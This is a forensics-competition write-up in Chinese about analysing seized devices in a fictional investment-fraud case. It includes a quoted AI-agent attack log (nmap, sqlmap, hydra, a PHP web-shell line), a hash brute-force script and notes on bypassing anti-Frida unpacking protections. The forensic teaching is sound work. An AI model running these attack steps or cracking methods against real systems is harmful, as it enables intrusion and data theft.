@@ -1,0 +1,8283 @@
+第四届 盘古石杯电子取证竞赛 初赛 题解
+https://forensics.xidian.edu.cn/writeups/PGS2026Preliminary/
+id=900d1f60-eb53-4769-b3c3-767b7cc5cec8
+source=XD Forensics Wiki
+author=
+第四届 盘古石杯电子取证竞赛 初赛 题解
+¶
+Author
+NoahTie & Track @ tratra 什么都会
+参赛和题解中均使用了弘连的商业取证软件, 包括: 火眼证据分析、火眼仿真取证、数据库取证取证工具及雷电 APP 智能分析。
+感谢上海弘连网络科技有限公司为西电电子数据取证提供的软件支持!
+比赛信息
+¶
+案情介绍
+¶
+2023 年 8 月, 境外"龙腾四海"犯罪集团在我国境内设立名为"金鳞资本"的投资诈骗窝点. 该团伙利用物联网入侵、人工智能技术及 Deepfake 深度伪造等新型科技手段, 实施精准诈骗, 涉案金额巨大, 受害群众众多. 经过公安机关的持续侦查与全力打击, 该犯罪组织在境内的诈骗团伙最终被成功摧毁, 有力维护了广大人民群众的财产安全.
+检材信息
+¶
+容器密码:
+VeZeTANHVkklvVljLnpOYeBwCJFYD5tFpf67f5kNuqP1G5jj
+检材清单:
+方俊郎
+phone.E01
+UDisk.img
+服务器
+server01
+server01-disk01.E01
+server01-disk02.E01
+server02
+server02-disk01.E01
+server02-disk02.E01
+server03
+server03-disk01.E01
+server03-disk02.E01
+黄志远
+car.E01
+PC.E01
+phone.E01
+林小婉
+林小婉手表.bin
+林小婉手机.zip
+刘洋
+liuyang_pc.E01
+ly-memdump.mem
+周文杰
+Image.zip
+黄志远手机
+¶
+Info
+以下题目分析黄志远
+phone.E01
+检材.
+01 黄志远手机总共安装了多少款短视频应用?
+¶
+答案
+5
+按照我朴素的认知来看, 抖音和快手应该属于短视频应用:
+还有
+com.sobey.fc.component.btvvideo
+(京 8):
+02 黄志远手机安装的龙虾应用的包名是什么?
+¶
+答案
+gptos.intelligence.assistant
+手机中唯一一个安装了的与 AI 相关的应用是
+gptos.intelligence.assistant
+, 在网上搜索包名可以找到 Google Play 的测试邀请界面, 可以看到应用名称和图标, 与 OpenClaw 相关:
+03 接上题, 首次打开应用的时间是?
+¶
+答案
+2026-04-17 11:53:18
+在应用数据目录的
+data/gptos.intelligence.assistant/files/setup.log
+文件中可以看到应用的初始化日志:
+Text Only
+=== Setup started Fri Apr 17 21:37:39 GMT+08:00 2026 ===
+[21:37:39] >> Checking proot binary...
+[21:37:39]    proot: /data/app/gptos.intelligence.assistant-icipHygRJNPnovFjCUACnA==/lib/arm64/libproot.so
+[21:37:39]    libtalloc.so.2:
+/data/user/0/gptos.intelligence.assistant/files/lib/libtalloc.so.2 (31440 bytes)
+[21:37:39]    LD_LIBRARY_PATH:
+/data/user/0/gptos.intelligence.assistant/files/lib:/data/app/gptos.intelligence.assistant-icipHygRJNPnovFjCUACnA==/lib/arm64
+[21:37:39]    Library links ready
+[2026-04-17 21:37:39] >> Extracting rootfs (rootfs.zip.bin)...
+根据日志的内容, 该应用在
+2026-04-17 21:37:39 UTC+08
+时初次运行并完成了初始化.
+另一种不同答案
+¶
+南警的一位师傅根据谷歌统计的存储文件, 给出了另外一种不同的答案:
+应用数据中的
+com.google.android.gms.measurement.prefs.xml
+文件为 Google Play 的遥测文件, 其中提及到:
+XML
+<long
+name=
+"first_open_time"
+value=
+"1776397998058"
+>
+将该时间戳转换为 DateTime 得到
+2026-04-17 11:53:18
+.
+这个答案应该更准确的答案, 用户可能在该时间启动了一次应用, 但还没等初始化开始或完成, 即终止了应用进程; 在稍晚的时间(2026-04-17 21:37:39 UTC+08)再次启动, 并完成了初始化, 并且这次运行时产生的日志覆盖了先前的日志.
+04 黄志远使用此应用攻击过多少台主机?
+¶
+答案
+0
+gptos.intelligence.assistant
+应用数据中没有找到 Agent 的使用记录.
+05 黄志远使用哪款应用控制了其 PC 的 agent 工具
+¶
+答案
+Discord
+根据黄志远的 PC 分析, 可以知道 PC 上安装的 agent 工具是 Hermes, 并且配置了 Discord Bot 进行远控.
+06 黄志远使用这款应用的版本是多少?
+¶
+答案
+311.20
+在火眼的基本信息 -> 应用列表分析结果中过滤包名
+com.discord
+, 可以看到其版本号为
+311020
+.
+在应用的数据文件
+data/com.discord/shared_prefs/BundleUpdater.xml
+中, 可以看到 OTA 版本号为
+311.20
+:
+XML
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+<string
+name=
+"build_override_cookie_header"
+></string>
+<string
+name=
+"key_android_js_bundle_release_name"
+>
+discord_android@311.20.334720-0+31102000334720
+</string>
+<string
+name=
+"ota_version"
+>
+311.20
+</string>
+<string
+name=
+"e_tag"
+>
+"80a67dbd8d67460d9744cf1da64f7568"
+</string>
+<string
+name=
+"key_android_js_bundle"
+>
+/data/user/0/com.discord/files/otas/84063de86423077d28ec224947e4ba279e115e72/app/src/main/assets/index.android.bundle
+</string>
+</map>
+在火眼的 App 分析 -> APK 列表分析结果中, 过滤包名
+com.discord
+后可以看到应用安装包显示的应用版本为
+311.20 - stable
+:
+07 接上题, 登录的用户名是什么?
+¶
+答案
+test901234
+在火眼的 Discord -> 账户信息分析结果中可以看到用户昵称为
+test901234.
+, 显示名为
+test901234
+:
+在频道信息中可以看到群主昵称为
+test901234
+:
+08 该应用与 pc 端 agent 的配对码是什么?
+¶
+答案
+3EXEQ5R8
+在 Discord 的数据库
+/data/com.discord/files/kv-storage/@account.1457974771206852664/a
+中的表
+messages0
+可以看到以二进制格式存储的消息内容:
+写一个简单的 Python 脚本读取数据库中的二进制数据并保存:
+Python
+import
+sqlite3
+con
+=
+sqlite3
+.
+connect
+(
+"a"
+)
+cur
+=
+con
+.
+cursor
+()
+data
+=
+cur
+.
+execute
+(
+"SELECT data FROM messages0;"
+)
+.
+fetchall
+()
+import
+json
+with
+open
+(
+"messages.txt"
+,
+"w"
+,
+encoding
+=
+"utf-8"
+)
+as
+file
+:
+for
+i
+in
+data
+:
+file
+.
+write
+(
+json
+.
+loads
+(
+i
+[
+0
+]
+.
+lstrip
+(
+b
+"
+\x08
+"
+)
+.
+decode
+())
+.
+get
+(
+"message"
+)
+.
+get
+(
+"content"
+))
+可以看到配对时的消息记录:
+09 该应用共对几个 ip 进行扫描?
+¶
+答案
+1
+接上题, 可以看到, 除了攻击
+192.168.61.135
+服务器的请求被 Agent 回复之外, 其他消息均未被 Agent 执行:
+10 该应用总共调用了几个暴力破解工具?
+¶
+答案
+1
+Agent 使用的工具包括:
+Text Only
+💻 terminal: "ping -c 3 192.168.61.135"
+💻 terminal: "nmap -sS -sV -sC -O -p- -T4 192.168.6..."
+📋 todo: "planning 5 task(s)"
+💻 terminal: "curl -s "http://192.168.61.135/" | he..."
+💻 terminal: "gobuster dir -u http://192.168.61.135..."
+💻 terminal: "curl -s "http://192.168.61.135:8000/""
+💻 terminal: "curl -s "http://192.168.61.135:8000/d..."
+💻 terminal: "curl -s "http://192.168.61.135:8000/o..."
+💻 terminal: "sqlmap -u "http://192.168.61.135/inde..."
+💻 terminal: "curl -X POST "http://192.168.61.135:8..." (×3)
+💻 terminal: "hydra -l admin -P /usr/share/wordlist..."
+💻 terminal: "sudo gunzip /usr/share/wordlists/rock..."
+💻 terminal: "curl -s "http://192.168.61.135/init.php""
+📋 todo: "planning 5 task(s)"
+💻 terminal: "curl -X POST "http://192.168.61.135/i..." (×2)
+💻 terminal: "curl -s "http://192.168.61.135/dashbo..."
+💻 terminal: "curl -s "http://192.168.61.135/upload..."
+💻 terminal: "curl -s "http://192.168.61.135:8000/a..."
+💻 terminal: "curl -X POST "http://192.168.61.135:8..." (×3)
+💻 terminal: "hydra -L /usr/share/wordlists/common-..."
+💻 terminal: "echo -e "admin\nroot\nuser\ntest\ngue..."
+💻 terminal: "ls -la /usr/share/wordlists/ | grep rock"
+💻 terminal: "sudo gunzip /usr/share/wordlists/rock..."
+💻 terminal: "curl -s "http://192.168.61.135/config..."
+💻 terminal: "curl -s "http://192.168.61.135/.git/H..."
+💻 terminal: "nikto -h http://192.168.61.135 -Tunin..."
+💻 terminal: "for file in config.php.bak config.php..."
+📚 skills_list: "security"
+📚 skill_view: "kali-penetration-testing-workflow" (×2)
+💻 terminal: "curl -s "http://192.168.61.135/index...."
+💻 terminal: "searchsploit openssh 9.2"
+💻 terminal: "searchsploit apache 2.4.66"
+📋 todo: "planning 5 task(s)"
+💻 terminal: "curl -X POST "http://192.168.61.135:8..."
+💻 terminal: "echo "<?php system(\$_GET['cmd']); ?>..."
+💻 terminal: "echo -e "admin123\ntest123\npassword\..."
+💻 terminal: "msfconsole -q -x "use auxiliary/scann..."
+💻 terminal: "curl -s "http://192.168.61.135/uploads/""
+💻 terminal: "curl -...
+其中具有暴力破解功能的工具只有 hydra.
+11 黄志远使用其内部通联工具进行沟通, 其账号的登陆密码是多少?
+¶
+答案
+08164085
+参考 周文杰的手机 部分.
+使用口令
+s-dbw1776839203359Goo
+打开数据库, 找到哈希和盐:
+又是拿答案格式当提示用, 服了. 答案格式全是数字, 所以爆破数字, 没有任何其他提示或者逻辑. 修改 周文杰的手机 部分的爆破脚本:
+Python
+import
+hashlib
+,
+time
+from
+multiprocessing
+import
+Pool
+,
+cpu_count
+from
+rich.progress
+import
+Progress
+,
+BarColumn
+,
+TextColumn
+,
+TimeRemainingColumn
+,
+TaskProgressColumn
+from
+rich.console
+import
+Console
+from
+rich.table
+import
+Table
+TARGET
+=
+"fc29eb768c139c05c0bfcb697d9b26d194878a66451b3ab91b202e9710874a63"
+SALT
+=
+"a3f8d9c2e1b4h7g6k9m2n5p8q1r4t7w"
+MAX_DIGITS
+=
+10
+CHUNK
+=
+100_000
+def
+check
+(
+args
+):
+start
+,
+end
+=
+args
+for
+n
+in
+range
+(
+start
+,
+end
+):
+p
+=
+f
+"
+{
+n
+:
+0
+{
+MAX_DIGITS
+}
+d
+}
+"
+h1
+=
+hashlib
+.
+sha256
+((
+p
++
+SALT
+)
+.
+encode
+())
+.
+hexdigest
+()
+if
+hashlib
+.
+sha256
+(
+h1
+.
+encode
+())
+.
+hexdigest
+()
+==
+TARGET
+:
+return
+p
+return
+None
+def
+main
+():
+total
+=
+10
+**
+MAX_DIGITS
+chunks
+=
+[(
+s
+,
+min
+(
+s
++
+CHUNK
+,
+total
+))
+for
+s
+in
+range
+(
+0
+,
+total
+,
+CHUNK
+)]
+console
+=
+Console
+()
+progress
+=
+Progress
+(
+TextColumn
+(
+"[bold cyan]
+{task.description}
+"
+),
+BarColumn
+(
+bar_width
+=
+40
+),
+TaskProgressColumn
+(),
+TextColumn
+(
+"·"
+),
+TimeRemainingColumn
+(),
+TextColumn
+(
+"·"
+),
+TextColumn
+(
+"[yellow]
+{task.fields[speed]}
+"
+),
+console
+=
+console
+,
+)
+found
+=
+None
+task
+=
+progress
+.
+add_task
+(
+"scanning"
+,
+total
+=
+len
+(
+chunks
+),
+speed
+=
+"--"
+,
+start
+=
+True
+)
+t0
+=
+time
+.
+time
+()
+with
+progress
+,
+Pool
+(
+cpu_count
+())
+as
+pool
+:
+for
+result
+in
+pool
+.
+imap_unordered
+(
+check
+,
+chunks
+):
+now
+=
+time
+.
+time
+()
+if
+result
+:
+found
+=
+result
+pool
+.
+terminate
+()
+break
+progress
+.
+update
+(
+task
+,
+advance
+=
+1
+,
+speed
+=
+f
+"
+{
+CHUNK
+*
+(
+progress
+.
+tasks
+[
+task
+]
+.
+completed
+or
+1
+)
+/
+(
+now
+-
+t0
+or
+1
+)
+/
+1e6
+:
+.1f
+}
+M/s"
+)
+progress
+.
+stop
+()
+elapsed
+=
+time
+.
+time
+()
+-
+t0
+if
+found
+:
+table
+=
+Table
+(
+title
+=
+"[bold green]PASSWORD FOUND[/bold green]"
+,
+show_header
+=
+False
+)
+table
+.
+add_column
+(
+style
+=
+"cyan"
+)
+table
+.
+add_column
+(
+style
+=
+"bold yellow"
+)
+table
+.
+add_row
+(
+"password"
+,
+found
+)
+table
+.
+add_row
+(
+"time"
+,
+f
+"
+{
+elapsed
+:
+.1f
+}
+s"
+)
+h1
+=
+hashlib
+.
+sha256
+((
+found
++
+SALT
+)
+.
+encode
+())
+.
+hexdigest
+()
+h2
+=
+hashlib
+.
+sha256
+(
+h1
+.
+encode
+())
+.
+hexdigest
+()
+table
+.
+add_row
+(
+"hash"
+,
+h2
+)
+console
+.
+print
+(
+table
+)
+else
+:
+console
+.
+print
+(
+f
+"[red]Not found (
+{
+elapsed
+:
+.1f
+}
+s)[/red]"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+爆破出来密码是
+08164085
+:
+12 黄志远一共发送过几个文件给代号军师的嫌疑人?
+¶
+答案
+2
+接上题, 在数据库的表
+files
+中看到 2 条文件传输记录:
+方俊朗手机
+¶
+Info
+以下题目分析方俊朗
+phone.E01
+检材.
+01 方俊郎手机总共安装了多少款理财应用
+¶
+答案
+4
+安装了 4 款理财相关的应用:
+02 方俊朗使用筛选优质客户的应用包名是什么
+¶
+答案
+com.example.predictor
+03 筛选优质客户应用将用户查询记录存储在一个加密的本地数据库中. 请问该加密数据库的文件名是什么
+¶
+答案
+chat_history.db
+火眼的 App 分析里发现了两个可疑的应用.
+一是题目中提到的筛选优质客户应用, 二是 social chat app, 从图标来看是 flutter 框架编写的, 很可能成为出题人的考察点.
+根据包名可以找到该应用的私有目录,
+/data/data/com.example.predictor
+. 其中的 databases 目录下存着加密数据库
+chat_history.db
+. 除此之外,
+shared_prefs
+目录里存着
+app_config.xml
+, 内容如下:
+XML
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+<string
+name=
+"key_version"
+>
+PBKDF2_v1
+</string>
+<int
+name=
+"key_iterations"
+value=
+"10000"
+/>
+<long
+name=
+"last_key_time"
+value=
+"1776525084207"
+/>
+<string
+name=
+"db_integrity_check"
+>
+270a843493bf85a1f6d0cbf5594e4ee7
+</string>
+</map>
+04 该应用使用了哪种密钥派生算法来生成数据库加密密钥? 请写出完整的算法标识名称
+¶
+答案
+PBKDF2WithHmacSHA256
+先分析该 App 的保护. 通过
+AndroidManifest.xml
+可以看到是个整体加固.
+具体来说, 该加壳器通过读 assets 下的 payload.bin 解密 dex 字节码并回填, 从而达到动态解密真实代码, 干扰静态分析的目的.
+脱这类整体加固壳的思路较为固定. 由于最终的 dex 完整代码会被解密到内存里, 所以一般通过 frida 搜索内存中的 dex 文件头即可, 或者该 App 下, 也可以 hook initDexFromMemory, 并获取该函数被调用时传递的参数, 也就是明文的 dex 字节数组.
+但注意到题目存在环境检测机制, 两部分分别用于对抗调试器和 frida 框架.
+绕过也很简单.
+hook java 的字符串方法. 可以在 spawn 模式 hook
+contains
+和
+startsWith
+等方法.
+魔改 frida. 本质上
+frida-agent
+和
+frida-gadget
+这两个字符串都是在 frida 注入时产生的, 因此可以通过魔改 frida 修改注入的
+.so
+文件名来绕过. github 上可以搜到非常多的开源魔改方案, 这里就不一一列举了.
+使用雷电 App 智能分析自带的环境隐藏. 比赛时测试可以成功脱壳.
+脱出来之后用 jadx 把六个 dex 全打开即可看到 App 真实逻辑. 其中
+ChatDatabaseHelper
+记录着数据库相关配置以及关键的加密密钥.
+KeyDeriver
+类下可以看到密钥派生算法是
+PBKDF2
+, 具体表示名称是
+PBKDF2WithHmacSHA256
+, 盐值通过三部分拼接生成, 并且如果产生异常会回退到默认的加密密钥.
+05 该应用的密钥派生过程中使用了多少次迭代运算
+¶
+答案
+10000
+见上题,
+PBKDF2_ITERATIONS = 10000
+.
+06 该应用检测动态调试工具时探测了哪个本地端口号
+¶
+答案
+27042
+脱壳后有一个
+SecurityManager
+类, 成员函数
+isFridaDetected
+检测了 frida,
+isXposedDetected
+检测了 xposed. 但题目说的是动态调试工具, 不知道指的是不是 frida, 但貌似只有一个端口检测, 所以这题写的是 27042.
+然后通过
+07 该应用密钥由多个"盐值片段"拼接后派生而来. 请问第一个盐值片段的具体内容是什么
+¶
+答案
+Pr3d1ct0r
+第一个盐值片段由下面的函数生成:
+Java
+private
+String
+getSaltPart1
+()
+{
+return
+"Pr3d1ct0r"
+;
+}
+因此答案为
+Pr3d1ct0r
+.
+08 当密钥派生过程出现异常时, 应用会使用一个硬编码的备用密钥. 请问该备用密钥的完整内容是什么
+¶
+答案
+f4ll8ack_k3y_2024_pr3d1ct0r
+整个密钥派生过程为:
+Java
+public
+String
+deriveKey
+()
+{
+try
+{
+String
+signatureHash
+=
+getAppSignatureHash
+();
+String
+salt1
+=
+getSaltPart1
+();
+String
+salt2
+=
+getSaltPart2
+();
+String
+salt3
+=
+getSaltPart3
+();
+Log
+.
+d
+(
+TAG
+,
+"Salt verification: "
++
+salt1
+);
+String
+combinedSeed
+=
+signatureHash
++
+salt1
++
+salt2
++
+salt3
+;
+PBEKeySpec
+spec
+=
+new
+PBEKeySpec
+(
+combinedSeed
+.
+toCharArray
+(),
+salt1
+.
+getBytes
+(),
+PBKDF2_ITERATIONS
+,
+256
+);
+SecretKeyFactory
+factory
+=
+SecretKeyFactory
+.
+getInstance
+(
+"PBKDF2WithHmacSHA256"
+);
+byte
+[]
+keyBytes
+=
+factory
+.
+generateSecret
+(
+spec
+).
+getEncoded
+();
+String
+finalKey
+=
+bytesToHex
+(
+keyBytes
+);
+saveKeyChecksum
+(
+finalKey
+);
+return
+finalKey
+;
+}
+catch
+(
+Exception
+e
+)
+{
+Log
+.
+e
+(
+TAG
+,
+"Key derivation failed, using fallback"
+);
+return
+"f4ll8ack_k3y_2024_pr3d1ct0r"
+;
+}
+}
+因此当出现异常时会返回
+f4ll8ack_k3y_2024_pr3d1ct0r
+作为备用密钥.
+09 分析"优质客户预测"应用, 该应用的安全检测模块通过检查一个特定的类名来判断设备是否安装了 Hook 框架. 请问被检测的完整类名是什么
+¶
+答案
+de.robv.android.xposed.XposedBridge
+见题目 04, 应该指的是 Xposed.
+10 该应用在偏好设置文件中存储了一个密钥校验值。请问存储该校验值的键名(key)是什么
+¶
+答案
+db_integrity_check
+见题目 01,
+app_config.xml
+中有一个键
+db_integrity_check
+疑似校验值, 实际在 jadx 里也有相关逻辑.
+并且可以进一步知道, 校验值是由 key 的字节算了一个 MD5 得到的.
+11 该应用加密数据库中存储对话记录的数据表名是什么
+¶
+答案
+chat_records
+需要用 SQLCipher 解密数据库. 因此需要获取解密参数, 也即密钥. 注意, 这里的其它解密参数, 例如KDF 迭代轮数, 算法等都是 SQLCipher 4 的默认参数, 而不是之前题目里的 10000, 那个是派生密钥用的, 这算是一个易错点.
+下面是密钥的详细派生过程:
+Java
+getAppSignatureHash
+()
+→
+PackageManager
+.
+getPackageInfo
+(
+packageName
+,
+64
+)
+→
+PackageInfo
+.
+signatures
+[
+0
+]
+→
+SHA
+-
+256
+(
+certificate
+DER
+bytes
+)
+getSaltPart1
+()
+=
+"Pr3d1ct0r"
+getSaltPart2
+()
+=
+"v2.0_"
++
+net
+.
+sqlcipher
+.
+BuildConfig
+.
+BUILD_TYPE
++
+"_S@lt"
+=
+"v2.0_release_S@lt"
+getSaltPart3
+()
+=
+new
+String
+(
+new
+char
+[]
+{
+'X'
+,
+'9'
+,
+'k'
+,
+'Z'
+,
+'!'
+,
+'q'
+,
+'W'
+,
+'3'
+})
+=
+"X9kZ!qW3"
+combinedSeed
+=
+"4f030268de5e58c26bb6eec54b1be7c0330dde2bf857ee2b3b26c50b25deb239"
++
+"Pr3d1ct0r"
++
+"v2.0_release_S@lt"
++
+"X9kZ!qW3"
+=
+"4f030268de5e58c26bb6eec54b1be7c0330dde2bf857ee2b3b26c50b25deb239Pr3d1ct0rv2.0_release_S@ltX9kZ!qW3"
+PBEKeySpec
+spec
+=
+new
+PBEKeySpec
+(
+combinedSeed
+.
+toCharArray
+(),
+←
+密码
+(
+全部ASCII
+)
+salt1
+.
+getBytes
+(),
+←
+PBKDF2
+salt
+10000
+,
+←
+迭代次数
+256
+←
+输出256
+bit
+);
+SecretKeyFactory
+.
+getInstance
+(
+"PBKDF2WithHmacSHA256"
+).
+generateSecret
+(
+spec
+).
+getEncoded
+()
+bytesToHex
+(
+keyBytes
+)
+=
+"93b16df295656676dd760e6dcfd71623e446b51c91b028ac84c88958fc3ad98b"
+从
+/data/system/packages.xml
+可以提取到证书的具体内容, 用 python 复现整个过程如下:
+Python
+import
+hashlib
+PBKDF2_ITERATIONS
+=
+10000
+PBKDF2_KEY_LENGTH
+=
+256
+salt1
+=
+"Pr3d1ct0r"
+salt2_build_type
+=
+"release"
+salt2
+=
+f
+"v2.0_
+{
+salt2_build_type
+}
+_S@lt"
+salt3_chars
+=
+[
+'X'
+,
+'9'
+,
+'k'
+,
+'Z'
+,
+'!'
+,
+'q'
+,
+'W'
+,
+'3'
+]
+salt3
+=
+""
+.
+join
+(
+salt3_chars
+)
+cert_hex_device
+=
+(
+"308202e4308201cc020101300d06092a864886f70d01010b0500303731163014"
+"06035504030c0d416e64726f69642044656275673110300e060355040a0c0741"
+"6e64726f6964310b30090603550406130255533020170d323531323038303435"
+"3735325a180f32303535313230313034353735325a3037311630140603550403"
+"0c0d416e64726f69642044656275673110300e060355040a0c07416e64726f69"
+"64310b300906035504061302555330820122300d06092a864886f70d01010105"
+"000382010f003082010a0282010100ca99652986461cbc1160638b62ada9834b"
+"8a51258241482de1a9db07b897c13f74847115edc427e6b86f28ac65bfeccf1b"
+"86b1f0f2920be05abba6baf621bdebec8b80515d9705f3513780570b5bf8d3cd"
+"87faaabc62517f60636c90bb8a6bf1a479bcec7592492e5652d0de99e3605ca2"
+"53cebaa9e3f2bfb29a6e68bb7dc454ce34c0b2222622c0193386c7615ad94d34"
+"629db0f80bd00f3c5b3f17d32ef989231d9fe25386b93f0388d660a499fcbb4f"
+"7a3a3b9913dc22d1c54d453be4415c5909db3ce6ecfd41e448f7ff6279ad765e"
+"ddcb8716c08d3942e98c93e2b6494cce3e412ceea4e0cdac3d68e13cf413400c"
+"9918c3fd9e7ed2cbfce6c6ca9ad3450203010001300d06092a864886f70d0101"
+"0b0500038201010033dfe1926f9bad8324969fd063dcfc022f821b9c470b57f6"
+"cb5a0b6a620fe1f9c62d0eb21944dc51303e8ca2edbf0531e42b77a7b19ab8c9"
+"acf0f035d69a8c982387f4f1544c7c1af3c163fac28e527fbbbe39c1ae0b9d92"
+"1d8c77e784f398b60f986cd8c0b154fd3af24f27de3f6437e4528378e3d06f0a"
+"404ce4c99dfb91376502c9b5a42293ac0de4981bcbb3bde83e0618aea0560345"
+"ae6f33d56539c1bfef8d39cb2a565259efd32cf7b5c6d0f81507882da12cc67b"
+"1ea90ad8967a3189312097e76a42f32172c281c8a950172a2455a82181f594fa"
+"53f72c066d586f3532649f14db2c9bdd1fb20b684599de5a30bfb12b0b877241"
+"b43dc3db8ecb71f0"
+)
+cert_der_device
+=
+bytes
+.
+fromhex
+(
+cert_hex_device
+)
+sig_hash_device
+=
+hashlib
+.
+sha256
+(
+cert_der_device
+)
+.
+hexdigest
+()
+combined_device
+=
+sig_hash_device
++
+salt1
++
+salt2
++
+salt3
+dk_device
+=
+hashlib
+.
+pbkdf2_hmac
+(
+"sha256"
+,
+combined_device
+.
+encode
+(
+"ascii"
+),
+salt1
+.
+encode
+(
+"ascii"
+),
+PBKDF2_ITERATIONS
+,
+dklen
+=
+PBKDF2_KEY_LENGTH
+//
+8
+)
+key_hex_device
+=
+dk_device
+.
+hex
+()
+# 这就是 sqlcipher 的解密密钥
+结果是 93b16df295656676dd760e6dcfd71623e446b51c91b028ac84c88958fc3ad98b. 然后去解密
+chat_history.db
+发现
+chat_records
+表下存储着对话记录.
+12 该应用的密钥生成逻辑，该应用中的第三个盐值片段是通过逐字符拼接生成的。请问该片段拼接后的完整内容是什么
+¶
+答案
+X9kZ!qW3
+见上题, salt3 由如下代码生成:
+Java
+private
+String
+getSaltPart3
+()
+{
+char
+[]
+chars
+=
+{
+'X'
+,
+'9'
+,
+'k'
+,
+'Z'
+,
+'!'
+,
+'q'
+,
+'W'
+,
+'3'
+};
+return
+new
+String
+(
+chars
+);
+}
+显然拼出来是
+X9kZ!qW3
+.
+13 该应用使用了载荷在内存中直接加载而不在磁盘落地。若选手希望通过Frida动态拦截明文的DEX字节数组，应该Hook该应用壳的哪个私有方法
+¶
+答案
+initDexFromMemory
+见题目 02.
+14 分析应用的壳代码逻辑，其解密密钥由3个字符串片段混淆拼接而成。请通过静态分析，还原用于解密的3个片段拼接合并后的完整密钥明文
+¶
+答案
+Sh3ll_L0ad3r_K3y_2024!
+壳的解密密钥由以下三部分构成:
+Java
+private
+String
+getKeyPart1
+()
+{
+return
+new
+String
+(
+Base64
+.
+decode
+(
+"U2gzbGxf"
+,
+0
+));
+}
+private
+String
+getKeyPart2
+()
+{
+byte
+[]
+xorBytes
+=
+{
+93
+,
+33
+,
+112
+,
+117
+,
+34
+,
+99
+,
+78
+,
+90
+};
+for
+(
+int
+i
+=
+0
+;
+i
+<
+xorBytes
+.
+length
+;
+i
+++
+)
+{
+xorBytes
+[
+i
+]
+=
+(
+byte
+)
+(
+xorBytes
+[
+i
+]
+^
+17
+);
+}
+return
+new
+String
+(
+xorBytes
+);
+}
+private
+String
+getKeyPart3
+()
+{
+return
+new
+StringBuilder
+(
+"!4202_y3"
+).
+reverse
+().
+toString
+();
+}
+组合一下就能得到:
+Sh3ll_L0ad3r_K3y_2024!
+15 当选手尝试使用frida-dexdump等通用脱壳工具动态附加时，应用会立刻闪退。请分析该逻辑，写出该线程触发进程自杀所调用的完整Java系统方法签名
+¶
+答案
+java.lang.System.exit(int)
+见题目 02, 通过分析 App 的环境检测逻辑, 可以看到当检测到可疑的特征时, 会调用
+System.exit(0)
+退出进程, 因此理论上完整方法签名为
+java.lang.System.exit(int)
+, 但也可能是指的 smali 形式的签名
+Ljava/lang/System;->exit(I)V
+, 不是很懂是要的哪个.
+16 方俊朗使用其内部通联工具时，共加入过几个群
+¶
+答案
+2
+这个题位置感觉不太好, 具体分析过程看周文杰Image.zip检材相关题目.
+解密数据库, 发现在 conversation 表里有两个群.
+17 方俊朗通过物联网设备漏洞，共获得多少用户信息
+¶
+答案
+32
+同上, 具体分析过程看周文杰Image.zip检材相关题目.
+解密消息的 python 脚本如下:
+Python
+import
+json
+,
+base64
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Util.Padding
+import
+unpad
+KEY
+=
+base64
+.
+b64decode
+(
+"bGx3iDfEn4O5kW+2hf0E594C+jcyE1aujg0RIE5DPMM="
+)
+IV
+=
+base64
+.
+b64decode
+(
+"y1q+/i9a/85OsPry0WMffw=="
+)
+with
+open
+(
+"message.json"
+,
+encoding
+=
+"utf-8"
+)
+as
+f
+:
+msgs
+=
+json
+.
+load
+(
+f
+)
+with
+open
+(
+"decrypted.txt"
+,
+"w"
+,
+encoding
+=
+"utf-8"
+)
+as
+out
+:
+for
+m
+in
+msgs
+:
+ct
+=
+base64
+.
+b64decode
+(
+m
+[
+"content"
+])
+pt
+=
+unpad
+(
+AES
+.
+new
+(
+KEY
+,
+AES
+.
+MODE_CBC
+,
+IV
+)
+.
+decrypt
+(
+ct
+),
+16
+)
+.
+decode
+()
+ts
+=
+m
+.
+get
+(
+"create_at"
+,
+0
+)
+if
+ts
+:
+from
+datetime
+import
+datetime
+ts
+=
+datetime
+.
+fromtimestamp
+(
+ts
+/
+1000
+)
+.
+strftime
+(
+"%Y-%m-
+%d
+%H:%M"
+)
+recalled
+=
+'[RECALLED]'
+if
+m
+[
+'state_bits'
+]
+==
+1
+else
+''
+deleted
+=
+'[DELETED]'
+if
+m
+[
+'extra_val'
+]
+==
+1
+else
+''
+out
+.
+write
+(
+f
+"[
+{
+ts
+}
+] [
+{
+m
+[
+'conversation_id'
+]
+}
+]
+{
+m
+[
+'sender_id'
+]
+}
+{
+recalled
+}
+{
+deleted
+}
+:
+{
+pt
+}
+\n
+"
+)
+发现这样一条对话, 基本确定通过智能家居漏洞利用技术非法获取了 32 条高端用户数据:
+基本可以认为方俊朗通过利用智能家居的漏洞, 采集用户数据, 并通过模型筛选高质量用户.
+综合此人的所有聊天消息, 我们发现菜商王(usr_caishangwang), 也就是方俊朗, 主要为该诈骗团伙提供技术支持, 具体涉及风控, 数据挖掘, 用户画像分析等, 他和军师、黑客帝、菜商王2 构成该团伙的技术核心. 军师(usr_junshi) 主要负责境内技术团队的组建、任务分派、跨部门协调及反侦查部署. 黑客帝(usr_heiked) 主要负责钓鱼网站构建、渗透工具, 包括但不限于针对汽车 (星途S7 Pro 的 "T-BOX工具包" 获取 CAN 总线数据)、智能家居 (扫地机器人 IoT 渗透工具、双向认证绕过脚本 "bypass_hilit.py") 的开发, 并窃取用户数据; 菜商王2(usr_caishangwang2) 主要负责前期非法数据的提供、招募引荐技术核心人员, 以及窃取数据的标准化初步处理 (数据清洗)
+周文杰手机
+¶
+分析周文杰Image.zip检材
+01 周文杰跟其犯罪团伙人员内部通联工具包名是
+¶
+答案
+com.socialchat.social_chat_app
+通过分析这几台手机的data 目录, 发现斗有一个共同的 social chat app, 而且是 flutter 编写的, 非常可疑, 很可能就是通联工具.
+02 内部通联app聊天数据库名称是
+¶
+答案
+social_chat.db
+03 内部通联app聊天数据库密码保存在哪个文件中
+¶
+答案
+FlutterSharedPreferences.xml
+04 周文杰内部通联app聊天数据库密码是
+¶
+答案
+s-dbw1776853545473Goo
+使用
+blutter
+可以 dump dart 字节码以及整个项目的结构, 常量值, 以及一个自动生成的 frida hook 脚本.
+下面是
+asm/social_chat_app/main.dart
+的汇编片段:
+发现完整密码由
+Pgs-dbw + DateTime::_getCurrentMicros + Good
+构成, 但实际用的是
+substring(2, length-1)
+的部分, 因此密码是
+s-dbw1776853545473Goo
+.
+之后就可以在 SQLCipher 中打开对应的数据库了, 消息都是加密的, 因此我们需要继续分析消息加密相关的代码. 发现是 AES 加密, 并且在 user 表下存着用户信息, 包括加密参数 key 和 iv,
